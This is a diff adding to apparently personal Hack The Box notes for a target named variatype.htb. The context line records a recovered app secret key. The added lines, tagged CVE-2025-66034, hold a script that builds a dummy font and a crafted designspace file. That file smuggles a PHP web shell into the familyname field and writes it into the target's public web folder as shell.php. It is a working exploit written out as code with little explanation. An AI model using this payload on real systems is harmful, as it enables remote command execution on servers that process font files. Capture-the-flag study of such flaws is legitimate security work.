@@ -253,3 +253,61 @@ if __name__ == '__main__':
 found secret key from app.py `7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371`
 
 #CVE-2025-66034 
+
+```
+ajdev@rootbox:~/HTB$ python3 << 'EOF'
+from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+fb = FontBuilder(1000, isTTF=True)
+fb.setupGlyphOrder([".notdef"])
+fb.setupCharacterMap({})
+
+pen = TTGlyphPen(None)
+pen.moveTo((0, 0))
+pen.lineTo((500, 0))
+pen.lineTo((500, 700))
+pen.lineTo((0, 700))
+pen.closePath()
+
+fb.setupGlyf({".notdef": pen.glyph()})
+fb.setupHorizontalMetrics({".notdef": (500, 0)})
+fb.setupHorizontalHeader(ascent=800, descent=-200)
+fb.setupNameTable({"familyName": "Test", "styleName": "Regular"})
+fb.setupOS2()
+fb.setupPost()
+fb.setupHead(unitsPerEm=1000)
+fb.font.save("dummy.ttf")
+print("done!")
+EOF
+
+file dummy.ttf
+done!
+dummy.ttf: TrueType Font data, 10 tables, 1st "OS/2", 4 names, Macintosh, type 1 string, TestRegular
+```
+
+```
+ajdev@rootbox:~/HTB$ cat > malicious.designspace << 'EOF'
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="4.1">
+  <axes>
+    <axis tag="wght" name="Weight" minimum="100" default="400" maximum="900"/>
+  </axes>
+  <sources>
+    <source filename="dummy.ttf" familyname="Test" stylename="Regular">
+      <location>
+        <dimension name="Weight" xvalue="400"/>
+      </location>
+    </source>
+  </sources>
+  <instances>
+    <instance
+      name="Regular"
+      familyname="<?php system($_GET['cmd']); ?>"
+      filename="/var/www/portal.variatype.htb/public/files/shell.php"
+      postscriptfontname="Test-Regular">
+    </instance>
+  </instances>
+</designspace>
+EOF
+```
